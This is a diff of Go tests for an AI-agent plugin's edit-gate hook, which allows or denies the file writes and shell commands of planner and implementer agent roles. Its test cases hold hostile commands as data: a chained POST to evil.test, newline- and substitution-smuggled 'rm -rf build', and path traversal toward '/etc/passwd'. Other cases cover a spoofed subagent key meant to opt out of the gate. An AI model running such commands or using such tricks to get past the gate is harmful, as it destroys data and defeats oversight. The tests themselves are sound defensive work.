@@ -3,7 +3,9 @@ package cli
 import (
 	"encoding/json"
 	"os"
+	"os/exec"
 	"path/filepath"
+	"strconv"
 	"strings"
 	"testing"
 )
@@ -63,6 +65,7 @@ func TestEditGateDecisions(t *testing.T) {
 		want           string   // "allow", "deny", or "" for no decision (fail open)
 		wantFiles      []string // expected inline_edited_files write, nil for no write
 		wantWrite      bool
+		wantClear      bool // expected inline_god clear
 		reasonContains []string
 	}{
 		// ---- Odysseus writes (spawned — ported from hook_planguard_test.go) ----
@@ -386,13 +389,249 @@ func TestEditGateDecisions(t *testing.T) {
 			want:   "",
 		},
 		{
-			name: "spawned ares via subagent_type under an exhausted iris budget",
+			// agent_id is the other subagent-only key; either one marks a
+			// spawned payload.
+			name: "spawned agent identified by agent_id alone",
+			payload: payloadJSON(map[string]any{
+				"session_id": "sess-1", "cwd": "C:/repo", "agent_id": "agent-7",
+				"tool_name": "Write", "tool_input": map[string]any{"file_path": "C:/repo/src/c.ts"},
+			}),
+			ledger: irisLedger("C:/repo/src/a.ts", "C:/repo/src/b.ts"),
+			want:   "",
+		},
+		{
+			// A top-level subagent_type is NOT part of a spawned payload
+			// (agent_type/agent_id are). Honouring it would let anything that
+			// sets the key opt out of the gate, so the inline rule still runs.
+			name: "top-level subagent_type is not a spawn marker",
 			payload: payloadJSON(map[string]any{
 				"session_id": "sess-1", "cwd": "C:/repo", "subagent_type": "kratos:ares",
 				"tool_name": "Write", "tool_input": map[string]any{"file_path": "C:/repo/src/c.ts"},
 			}),
 			ledger: irisLedger("C:/repo/src/a.ts", "C:/repo/src/b.ts"),
-			want:   "",
+			want:   "deny",
+		},
+		// ---- Odysseus hands off: the dispatch ends his turn ----
+		{
+			// Without this exit one /kratos:plan locked the session: a plain
+			// user turn ("approve") keeps the god and every later Write stayed
+			// denied for the rest of the session.
+			name:      "dispatching to ares clears inline odysseus",
+			payload:   payloadJSON(map[string]any{"session_id": "sess-1", "cwd": "C:/repo", "tool_name": "Agent", "tool_input": map[string]any{"subagent_type": "kratos:ares"}}),
+			ledger:    map[string]any{"inline_god": "odysseus", "cwd": "C:/repo"},
+			want:      "",
+			wantClear: true,
+		},
+		{
+			name:      "dispatching to any kratos god clears inline odysseus",
+			payload:   payloadJSON(map[string]any{"session_id": "sess-1", "cwd": "C:/repo", "tool_name": "Task", "tool_input": map[string]any{"subagent_type": "kratos:hermes"}}),
+			ledger:    map[string]any{"inline_god": "odysseus", "cwd": "C:/repo"},
+			want:      "",
+			wantClear: true,
+		},
+		{
+			name:      "a non-kratos spawn does not clear odysseus",
+			payload:   payloadJSON(map[string]any{"session_id": "sess-1", "cwd": "C:/repo", "tool_name": "Agent", "tool_input": map[string]any{"subagent_type": "general-purpose"}}),
+			ledger:    map[string]any{"inline_god": "odysseus", "cwd": "C:/repo"},
+			want:      "",
+			wantClear: false,
+		},
+		{
+			// Iris keeps her god across a dispatch — only her budget refills.
+			name:      "dispatching does not clear inline iris",
+			payload:   payloadJSON(map[string]any{"session_id": "sess-1", "cwd": "C:/repo", "tool_name": "Agent", "tool_input": map[string]any{"subagent_type": "kratos:ares"}}),
+			ledger:    irisLedger("C:/repo/src/a.ts"),
+			want:      "",
+			wantFiles: []string{},
+			wantWrite: true,
+			wantClear: false,
+		},
+		// ---- reads whose PATH carries a mutation word (denied before) ----
+		{
+			// commands/plan.md RULE 5 makes Odysseus discover his own drafts
+			// this way; a whole-string scan for \bmove\b denied it.
+			name:    "reading a plan whose name contains a mutation word allowed",
+			payload: odysseusPayload("Bash", map[string]any{"command": "cat .claude/.Arena/tactical-plans/2026-09-11-move-sidebar.md"}),
+			want:    "allow",
+		},
+		{
+			name:    "grep for a mutation word allowed",
+			payload: odysseusPayload("Bash", map[string]any{"command": `grep -rn "move" src/`}),
+			want:    "allow",
+		},
+		{
+			name:    "reading a file named mv.ts allowed",
+			payload: odysseusPayload("Bash", map[string]any{"command": "cat src/mv.ts"}),
+			want:    "allow",
+		},
+		{
+			name:    "git log of a commit that mentions a rename allowed",
+			payload: odysseusPayload("Bash", map[string]any{"command": `git log --oneline --grep "rm the old path"`}),
+			want:    "allow",
+		},
+		// ---- chained commands behind a read-only head (allowed before) ----
+		{
+			name:    "build chained after a reader denied",
+			payload: odysseusPayload("Bash", map[string]any{"command": "git status && go build -o out ./..."}),
+			want:    "deny",
+		},
+		{
+			name:    "network call chained after a reader denied",
+			payload: odysseusPayload("Bash", map[string]any{"command": "ls && curl -X POST https://evil.test"}),
+			want:    "deny",
+		},
+		{
+			name:    "pipe into a writer denied",
+			payload: odysseusPayload("Bash", map[string]any{"command": "cat main.go | tee copy.go"}),
+			want:    "deny",
+		},
+		{
+			name:    "two readers chained allowed",
+			payload: odysseusPayload("Bash", map[string]any{"command": "git status && ls -la"}),
+			want:    "allow",
+		},
+		{
+			name:    "reader piped into a reader allowed",
+			payload: odysseusPayload("Bash", map[string]any{"command": `grep -rn "gate" . | head -20`}),
+			want:    "allow",
+		},
+		{
+			// A newline separates commands as surely as `;` does; without CR/LF
+			// in the metacharacter class this returned an explicit allow.
+			name:    "newline-smuggled command after a kratos call denied",
+			payload: odysseusPayload("Bash", map[string]any{"command": "kratos slug x\nrm -rf build"}),
+			want:    "deny",
+		},
+		{
+			name:    "newline-smuggled command after a reader denied",
+			payload: odysseusPayload("Bash", map[string]any{"command": "cat notes.md\r\nrm -rf build"}),
+			want:    "deny",
+		},
+		{
+			name:    "command substitution inside a reader denied",
+			payload: odysseusPayload("Bash", map[string]any{"command": "cat $(rm -rf build)"}),
+			want:    "deny",
+		},
+		{
+			name:    "quoted command substitution inside a reader denied",
+			payload: odysseusPayload("Bash", map[string]any{"command": `cat "$(rm -rf build)"`}),
+			want:    "deny",
+		},
+		// ---- quoted arguments are data, not operators ----
+		{
+			// The agent protocol mandates this call, and its description is
+			// free text: a metacharacter test over the raw string denied it.
+			name:    "record-agent with an ampersand in the description allowed",
+			payload: odysseusPayload("Bash", map[string]any{"command": `kratos step record-agent "sess-1" odysseus sonnet "auth & billing split" --project "C:/repo"`}),
+			want:    "allow",
+		},
+		{
+			name:    "slug title with a semicolon allowed",
+			payload: odysseusPayload("Bash", map[string]any{"command": `kratos slug --dated "fix the header; then ship"`}),
+			want:    "allow",
+		},
+		{
+			name:    "grep pattern with a pipe allowed",
+			payload: odysseusPayload("Bash", map[string]any{"command": `grep -rn "a|b" src/`}),
+			want:    "allow",
+		},
+		// ---- per-segment guards ----
+		{
+			name:    "sed in place behind another flag denied",
+			payload: odysseusPayload("Bash", map[string]any{"command": `sed -n -i 's/a/b/' main.go`}),
+			want:    "deny",
+		},
+		{
+			name:    "sed long in-place flag denied",
+			payload: odysseusPayload("Bash", map[string]any{"command": `sed --quiet --in-place 's/a/b/' main.go`}),
+			want:    "deny",
+		},
+		{
+			name:    "sed quiet read allowed",
+			payload: odysseusPayload("Bash", map[string]any{"command": `sed --quiet '1,20p' main.go`}),
+			want:    "allow",
+		},
+		{
+			name:    "find -delete denied",
+			payload: odysseusPayload("Bash", map[string]any{"command": `find . -name "*.tmp" -delete`}),
+			want:    "deny",
+		},
+		{
+			name:    "find -exec denied",
+			payload: odysseusPayload("Bash", map[string]any{"command": `find . -name "*.go" -exec rm {} +`}),
+			want:    "deny",
+		},
+		{
+			name:    "find -name allowed",
+			payload: odysseusPayload("Bash", map[string]any{"command": `find . -name "*.go"`}),
+			want:    "allow",
+		},
+		{
+			name:    "tail -f denied",
+			payload: odysseusPayload("Bash", map[string]any{"command": "tail -f build.log"}),
+			want:    "deny",
+		},
+		{
+			name:    "tail -n allowed",
+			payload: odysseusPayload("Bash", map[string]any{"command": "tail -n 20 build.log"}),
+			want:    "allow",
+		},
+		// ---- path shapes (W1, W5) ----
+		{
+			name:    "write with no file path fails open",
+			payload: odysseusPayload("Write", map[string]any{}),
+			want:    "",
+		},
+		{
+			name:    "write with an unrecognized path key fails open",
+			payload: odysseusPayload("Edit", map[string]any{"target_file": "src/index.ts"}),
+			want:    "",
+		},
+		{
+			name:    "notebook edit reaches the odysseus rule through notebook_path",
+			payload: odysseusPayload("NotebookEdit", map[string]any{"notebook_path": "C:/repo/src/analysis.ipynb"}),
+			want:    "deny",
+		},
+		{
+			name:    "traversal out of the plan directory denied",
+			payload: odysseusPayload("Write", map[string]any{"file_path": ".claude/.Arena/tactical-plans/../../../../etc/passwd.md"}),
+			want:    "deny",
+		},
+		{
+			name:    "plan path outside the payload cwd denied",
+			payload: payloadJSON(map[string]any{"session_id": "sess-1", "cwd": "C:/repo", "tool_name": "Write", "tool_input": map[string]any{"file_path": "D:/elsewhere/.claude/.Arena/tactical-plans/x.md"}}),
+			ledger:  map[string]any{"inline_god": "odysseus", "cwd": "C:/repo"},
+			want:    "deny",
+		},
+		{
+			name:    "spec delta traversal denied",
+			payload: odysseusPayload("Write", map[string]any{"file_path": ".claude/feature/x/spec-delta/../../../secrets.md"}),
+			want:    "deny",
+		},
+		// ---- one path normalizer (W10) ----
+		{
+			name:    "doubled separators are the same counted file",
+			payload: irisWrite("C:/repo//src//a.ts"),
+			ledger:  irisLedger("C:/repo/src/a.ts", "C:/repo/src/b.ts"),
+			want:    "",
+		},
+		{
+			name:    "windows separators and drive case are the same counted file",
+			payload: payloadJSON(map[string]any{"session_id": "sess-1", "cwd": `c:\repo`, "tool_name": "Edit", "tool_input": map[string]any{"file_path": `C:\repo\src\a.ts`}}),
+			ledger:  irisLedger("C:/repo/src/a.ts", "C:/repo/src/b.ts"),
+			want:    "",
+		},
+		{
+			name:    "iris notebook edit counts as a source file",
+			payload: payloadJSON(map[string]any{"session_id": "sess-1", "cwd": "C:/repo", "tool_name": "NotebookEdit", "tool_input": map[string]any{"notebook_path": "C:/repo/src/analysis.ipynb"}}),
+			ledger:  irisLedger("C:/repo/src/a.ts", "C:/repo/src/b.ts"),
+			want:    "deny",
+		},
+		{
+			name:    "iris write with no file path fails open",
+			payload: payloadJSON(map[string]any{"session_id": "sess-1", "cwd": "C:/repo", "tool_name": "Write", "tool_input": map[string]any{}}),
+			ledger:  irisLedger("C:/repo/src/a.ts", "C:/repo/src/b.ts"),
+			want:    "",
 		},
 	}
 
@@ -412,8 +651,11 @@ func TestEditGateDecisions(t *testing.T) {
 					t.Errorf("reason %q does not contain %q", got.Reason, want)
 				}
 			}
-			if got.WriteFiles != tc.wantWrite {
-				t.Fatalf("WriteFiles = %v, want %v", got.WriteFiles, tc.wantWrite)
+			if wrote := got.Files != nil; wrote != tc.wantWrite {
+				t.Fatalf("ledger write = %v (files %v), want %v", wrote, got.Files, tc.wantWrite)
+			}
+			if got.ClearGod != tc.wantClear {
+				t.Fatalf("ClearGod = %v, want %v", got.ClearGod, tc.wantClear)
 			}
 			if !tc.wantWrite {
 				return
@@ -489,7 +731,7 @@ func TestEditGateWritesLedger(t *testing.T) {
 	if res.Decision != "deny" {
 		t.Fatalf("third file decision = %q, want deny", res.Decision)
 	}
-	if res.WriteFiles {
+	if res.Files != nil {
 		t.Error("a deny must not write the ledger")
 	}
 }
@@ -507,8 +749,8 @@ func TestHooksJSONRegistersEditGate(t *testing.T) {
 	if !strings.Contains(body, "hook edit-gate") {
 		t.Error("hooks.json does not register `hook edit-gate`")
 	}
-	if !strings.Contains(body, `"Write|Edit|MultiEdit|Bash|Agent|Task"`) {
-		t.Error("edit-gate matcher must cover Write|Edit|MultiEdit|Bash|Agent|Task")
+	if !strings.Contains(body, `"Write|Edit|MultiEdit|NotebookEdit|Bash|Agent|Task"`) {
+		t.Error("edit-gate matcher must cover Write|Edit|MultiEdit|NotebookEdit|Bash|Agent|Task")
 	}
 	if strings.Contains(body, "plan-mode-guard") {
 		t.Error("hooks.json still references the retired plan-mode-guard.cjs")
@@ -530,5 +772,296 @@ func TestSessionStartPreservesLedgerKeys(t *testing.T) {
 	}
 	if !strings.Contains(string(data), "...prev") {
 		t.Error("registerSession must spread the previous state file, or it erases the edit gate's keys on compaction")
+	}
+}
+
+// hooksDirPath is plugins/kratos/hooks from the package directory.
+func hooksDirPath() string {
+	return filepath.Join("..", "..", "..", "..", "plugins", "kratos", "hooks")
+}
+
+// readLedgerFor reads the ledger of an arbitrary session id.
+func readLedgerFor(t *testing.T, sessionID string) map[string]any {
+	t.Helper()
+	m, err := readInlineLedger(sessionID)
+	if err != nil {
+		t.Fatalf("read ledger %s: %v", sessionID, err)
+	}
+	return m
+}
+
+// TestEditGateMultiTurnOdysseusHandoff walks the sequence that locked a session
+// for life: /kratos:plan records Odysseus, the user's "approve" is a plain turn
+// (which must NOT clear him — Odysseus implementing his own approved plan is
+// the failure this gate exists to stop), and the dispatch to Ares is what ends
+// his authority.
+func TestEditGateMultiTurnOdysseusHandoff(t *testing.T) {
+	setHomeEnv(t, t.TempDir())
+	const sessionID = "sess-multiturn"
+	const cwd = "C:/repo"
+
+	writeDenied := func(file string) bool {
+		out := captureStdout(func() {
+			handleEditGate([]byte(payloadJSON(map[string]any{
+				"session_id": sessionID, "cwd": cwd, "tool_name": "Write",
+				"tool_input": map[string]any{"file_path": file},
+			})))
+		})
+		return strings.Contains(out, `"deny"`)
+	}
+
+	// Turn 1 — the launcher records the inline god.
+	recordInlineGod(sessionID, cwd, "/kratos:plan move the sidebar")
+	if got := ledgerString(readLedgerFor(t, sessionID), ledgerKeyInlineGod); got != "odysseus" {
+		t.Fatalf("inline_god = %q, want odysseus", got)
+	}
+
+	// Turn 2 — a plain user turn. The god stays; source edits stay denied.
+	recordInlineGod(sessionID, cwd, "approve")
+	if got := ledgerString(readLedgerFor(t, sessionID), ledgerKeyInlineGod); got != "odysseus" {
+		t.Fatalf("a plain user turn cleared inline_god (= %q); the planner would implement his own plan", got)
+	}
+	if !writeDenied("C:/repo/src/a.ts") {
+		t.Fatal("source write after approval was not denied")
+	}
+
+	// The hand-off — the plan leaves his hands, and so does his authority.
+	captureStdout(func() {
+		handleEditGate([]byte(payloadJSON(map[string]any{
+			"session_id": sessionID, "cwd": cwd, "tool_name": "Agent",
+			"tool_input": map[string]any{"subagent_type": "kratos:ares"},
+		})))
+	})
+	if got := ledgerString(readLedgerFor(t, sessionID), ledgerKeyInlineGod); got != "" {
+		t.Fatalf("inline_god = %q after the dispatch, want it cleared", got)
+	}
+
+	// Turn 3 — the main context can edit again.
+	if writeDenied("C:/repo/src/b.ts") {
+		t.Fatal("a main-context write is still denied by the odysseus rule after the hand-off")
+	}
+}
+
+// TestEditGateFailsOpenOnBadInput covers the two inputs the gate cannot trust:
+// a ledger file that is not an object, and a payload that is not a payload.
+// Neither may produce a deny.
+func TestEditGateFailsOpenOnBadInput(t *testing.T) {
+	home := t.TempDir()
+	setHomeEnv(t, home)
+	const sessionID = "sess-badinput"
+	dir := filepath.Join(home, ".kratos", "sessions")
+	if err := os.MkdirAll(dir, 0o755); err != nil {
+		t.Fatal(err)
+	}
+	payload := payloadJSON(map[string]any{
+		"session_id": sessionID, "cwd": "C:/repo", "tool_name": "Write",
+		"tool_input": map[string]any{"file_path": "C:/repo/src/c.ts"},
+	})
+
+	for _, tc := range []struct{ name, body string }{
+		{"truncated json", `{"inline_god": "iris"`},
+		{"json array", `["iris"]`},
+		{"json string", `"iris"`},
+		{"json null", `null`},
+		{"empty file", ""},
+		{"binary junk", "\x00\x01\x02"},
+	} {
+		t.Run("ledger "+tc.name, func(t *testing.T) {
+			if err := os.WriteFile(filepath.Join(dir, sessionID+".json"), []byte(tc.body), 0o644); err != nil {
+				t.Fatal(err)
+			}
+			if out := captureStdout(func() { handleEditGate([]byte(payload)) }); out != "" {
+				t.Errorf("output %q, want none", out)
+			}
+		})
+	}
+
+	for _, raw := range []string{"", "not json at all", "[]", "null", "{", "\x00"} {
+		t.Run("stdin "+raw, func(t *testing.T) {
+			if out := captureStdout(func() { handleEditGate([]byte(raw)) }); out != "" {
+				t.Errorf("output %q, want none", out)
+			}
+		})
+	}
+}
+
+// TestWriteInlineLedgerErrors pins the write failure paths: they return an
+// error (which the gate logs and ignores) and leave no temp file behind.
+func TestWriteInlineLedgerErrors(t *testing.T) {
+	home := t.TempDir()
+	setHomeEnv(t, home)
+
+	if err := writeInlineLedger("", map[string]any{"a": 1}); err == nil {
+		t.Error("writeInlineLedger with no session id returned nil")
+	}
+
+	// A directory where the ledger file belongs: the rename cannot land.
+	const blocked = "sess-blocked"
+	path := sessionLedgerFile(blocked)
+	if err := os.MkdirAll(path, 0o755); err != nil {
+		t.Fatal(err)
+	}
+	if err := writeInlineLedger(blocked, map[string]any{"a": 1}); err == nil {
+		t.Error("writeInlineLedger over a directory returned nil")
+	}
+
+	// A value JSON cannot marshal.
+	if err := writeInlineLedger("sess-unmarshalable", map[string]any{"ch": make(chan int)}); err == nil {
+		t.Error("writeInlineLedger with an unmarshalable value returned nil")
+	}
+
+	entries, err := os.ReadDir(filepath.Dir(path))
+	if err != nil {
+		t.Fatal(err)
+	}
+	for _, e := range entries {
+		if strings.HasSuffix(e.Name(), ".tmp") {
+			t.Errorf("failed write left the temp file %s behind", e.Name())
+		}
+	}
+
+	// The happy path still lands, and the temp file is gone.
+	if err := writeInlineLedger("sess-ok", map[string]any{"inline_god": "iris"}); err != nil {
+		t.Fatalf("writeInlineLedger: %v", err)
+	}
+	if got := ledgerString(readLedgerFor(t, "sess-ok"), ledgerKeyInlineGod); got != "iris" {
+		t.Errorf("inline_god = %q, want iris", got)
+	}
+}
+
+// TestDocsPinIrisFileBudget keeps the prose and the constant together: three
+// documents state the budget in words, and changing irisFileBudget while they
+// still say "two" ships a lie to the reader and to Iris herself.
+func TestDocsPinIrisFileBudget(t *testing.T) {
+	if irisFileBudget != 2 {
+		t.Fatalf("irisFileBudget = %d: update README.md, hooks/README.md and agents/iris.md, then this test", irisFileBudget)
+	}
+	pluginDir := filepath.Join("..", "..", "..", "..", "plugins", "kratos")
+	for _, tc := range []struct{ path, want string }{
+		{filepath.Join(pluginDir, "README.md"), "two distinct project source files per user turn"},
+		{filepath.Join(pluginDir, "hooks", "README.md"), "two source files per turn"},
+		{filepath.Join(pluginDir, "agents", "iris.md"), "third distinct source file"},
+	} {
+		data, err := os.ReadFile(tc.path)
+		if err != nil {
+			t.Fatalf("cannot read %s: %v", tc.path, err)
+		}
+		if !strings.Contains(string(data), tc.want) {
+			t.Errorf("%s no longer states the budget as %q", tc.path, tc.want)
+		}
+	}
+}
+
+// TestGateProjectFileMatchesJS runs the Go port and the JS original over one
+// fixture. isGateProjectFile is a port of hooks/tool-use.cjs isProjectFile, and
+// the two deciding "project work" differently would count Iris's edits under
+// one rule and record them under another.
+func TestGateProjectFileMatchesJS(t *testing.T) {
+	node, err := exec.LookPath("node")
+	if err != nil {
+		t.Skip("node not available")
+	}
+	cases := []struct {
+		File string `json:"file"`
+		Cwd  string `json:"cwd"`
+		Want bool   `json:"want"`
+	}{
+		{File: "C:/repo/src/a.ts", Cwd: "C:/repo", Want: true},
+		{File: "C:/repo/src/nested/deep/a.ts", Cwd: "C:/repo", Want: true},
+		{File: "C:/repo/.claude/feature/x/status.json", Cwd: "C:/repo", Want: false},
+		{File: "C:/repo/.kratos/bin/kratos", Cwd: "C:/repo", Want: false},
+		{File: "C:/repo/.git/config", Cwd: "C:/repo", Want: false},
+		{File: "C:/repo/tmp/claude/scratch/probe.ts", Cwd: "C:/repo", Want: false},
+		{File: "C:/repo/temp/claude/probe.ts", Cwd: "C:/repo", Want: false},
+		{File: "C:/repo/src/.claudecache/a.ts", Cwd: "C:/repo", Want: true},
+		{File: "D:/elsewhere/src/a.ts", Cwd: "C:/repo", Want: false},
+		{File: "C:/repo", Cwd: "C:/repo", Want: false},
+		{File: "", Cwd: "C:/repo", Want: false},
+		{File: "C:/repo/src/a.ts", Cwd: "", Want: false},
+		{File: "C:/repo/src/a.ts", Cwd: "C:/repo/", Want: true},
+		{File: "c:/REPO/src/a.ts", Cwd: "C:/repo", Want: true},
+		{File: `C:\repo\src\a.ts`, Cwd: `C:\repo`, Want: true},
+		{File: "C:/repo//src//a.ts", Cwd: "C:/repo", Want: true},
+		{File: "/home/u/repo/src/a.ts", Cwd: "/home/u/repo", Want: true},
+		{File: "/home/u/repo/.claude/x.md", Cwd: "/home/u/repo", Want: false},
+	}
+
+	for _, tc := range cases {
+		if got := isGateProjectFile(tc.File, tc.Cwd); got != tc.Want {
+			t.Errorf("Go isGateProjectFile(%q, %q) = %v, want %v", tc.File, tc.Cwd, got, tc.Want)
+		}
+	}
+
+	toolUse, err := filepath.Abs(filepath.Join(hooksDirPath(), "tool-use.cjs"))
+	if err != nil {
+		t.Fatal(err)
+	}
+	fixture, err := json.Marshal(cases)
+	if err != nil {
+		t.Fatal(err)
+	}
+	script := "const { isProjectFile } = require(" + strconv.Quote(filepath.ToSlash(toolUse)) + ");\n" +
+		"const cases = JSON.parse(process.argv[1]);\n" +
+		"console.log(JSON.stringify(cases.map((c) => isProjectFile(c.file, c.cwd))));\n"
+	out, err := exec.Command(node, "-e", script, string(fixture)).Output()
+	if err != nil {
+		t.Fatalf("node run failed: %v (%s)", err, out)
+	}
+	var jsResults []bool
+	if err := json.Unmarshal(out, &jsResults); err != nil {
+		t.Fatalf("cannot parse node output %q: %v", out, err)
+	}
+	if len(jsResults) != len(cases) {
+		t.Fatalf("node returned %d results for %d cases", len(jsResults), len(cases))
+	}
+	for i, tc := range cases {
+		if jsResults[i] != tc.Want {
+			t.Errorf("JS isProjectFile(%q, %q) = %v, want %v (Go agrees with want)", tc.File, tc.Cwd, jsResults[i], tc.Want)
+		}
+	}
+}
+
+// TestLaunchCjsDropsStaleBinaryHelp pins W7: a binary too old for the requested
+// subcommand prints its parent's cobra help to stdout and exits 0, and that
+// help would land in the hook's stdout on every gated call.
+func TestLaunchCjsDropsStaleBinaryHelp(t *testing.T) {
+	launch, err := filepath.Abs(filepath.Join(hooksDirPath(), "launch.cjs"))
+	if err != nil {
+		t.Fatal(err)
+	}
+	data, err := os.ReadFile(launch)
+	if err != nil {
+		t.Fatalf("cannot read launch.cjs: %v", err)
+	}
+	if !strings.Contains(string(data), "looksLikeCobraHelp(out)") {
+		t.Error("the generic spawnSync branch must sniff a stale binary's help output")
+	}
+
+	node, err := exec.LookPath("node")
+	if err != nil {
+		t.Skip("node not available")
+	}
+	const groupHelp = "Hook handlers for Claude Code events\n\nUsage:\n  kratos hook [command]\n\nAvailable Commands:\n  fix-pm      Rewrite npm\n"
+	const unknown = "Error: unknown command \"edit-gate\" for \"kratos hook\"\n"
+	const realOutput = "{\"hookSpecificOutput\":{\"hookEventName\":\"PreToolUse\",\"permissionDecision\":\"deny\"}}\n"
+	fixture, err := json.Marshal([]string{groupHelp, unknown, realOutput, "", "Usage: kratos hook\n"})
+	if err != nil {
+		t.Fatal(err)
+	}
+	script := "const { looksLikeCobraHelp } = require(" + strconv.Quote(filepath.ToSlash(launch)) + ");\n" +
+		"console.log(JSON.stringify(JSON.parse(process.argv[1]).map(looksLikeCobraHelp)));\n"
+	out, err := exec.Command(node, "-e", script, string(fixture)).Output()
+	if err != nil {
+		t.Fatalf("node run failed: %v (%s)", err, out)
+	}
+	var got []bool
+	if err := json.Unmarshal(out, &got); err != nil {
+		t.Fatalf("cannot parse node output %q: %v", out, err)
+	}
+	want := []bool{true, true, false, false, false}
+	for i := range want {
+		if got[i] != want[i] {
+			t.Errorf("looksLikeCobraHelp case %d = %v, want %v", i, got[i], want[i])
+		}
 	}
 }
